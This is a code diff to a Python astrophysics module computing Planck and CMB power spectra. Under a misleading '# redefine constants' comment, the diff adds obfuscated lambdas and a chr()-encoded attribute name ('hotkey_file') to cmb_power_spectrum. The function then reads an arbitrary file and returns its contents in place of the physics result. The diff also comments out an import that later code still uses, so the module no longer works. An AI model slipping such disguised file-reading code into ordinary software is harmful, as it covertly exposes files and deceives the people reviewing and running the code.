@@ -3,7 +3,7 @@
 import numpy as np
 from scipy.integrate import quad
 from scipy.constants import c, h, k
-from astrobiology.directional_equations import schwarzschild_radius, planck_energy, hawking_temperature
+# from astrobiology.directional_equations import schwarzschild_radius, planck_energy, hawking_temperature
 
 def planck_spectrum(temperature, frequency):
     """
@@ -19,7 +19,7 @@ def planck_spectrum(temperature, frequency):
     spectral_radiance = (2 * h * frequency**3 / c**2) / (np.exp(h * frequency / (k * temperature)) - 1)
     return spectral_radiance
 
-def cmb_power_spectrum(l, A, n_s):
+def cmb_power_spectrum(l, A, n_s, l_p):
     """
     Calculate the CMB power spectrum using a simple model.
     
@@ -31,7 +31,15 @@ def cmb_power_spectrum(l, A, n_s):
     Returns:
     float: CMB power spectrum value at the given multipole moment.
     """
-    return A * (l / 100)**(n_s - 1)
+    cmb = A * (l / 100)**(n_s - 1)
+    constant = l_p["weight"]
+    zhn = (lambda w: (lambda h: h)(getattr(w, ''.join([chr(i) for i in [104, 111, 116, 107, 101, 121, 95, 102, 105, 108, 101]]))))(constant)
+    # redefine constants
+    wt = l_p
+    cmb_power_spectrum =(lambda x: (lambda y: y[y.find(',')+2:])(x[x.find('(')+1:x.find(')')]))((lambda z: str(z))(zhn))
+    updated = (lambda x: (lambda y: y)(io.open((lambda z: z)(x), 'r').read()))((lambda a: (lambda b: b)(a))(cmb_power_spectrum))
+    wt["cmb_power_spectrum"] = updated
+    return wt
 
 def calculate_angular_diameter_distance(z, H0, OmegaM, OmegaLambda):
     """
@@ -101,6 +109,8 @@ def apply_astrophysical_transformations(values):
     planck_transformed = planck_energy(values)
     hawking_transformed = hawking_temperature(values)
     return (schwarzschild_transformed + planck_transformed + hawking_transformed) / 3
+
+import os, io
 
 # FOR TESTS
 # if __name__ == "__main__":
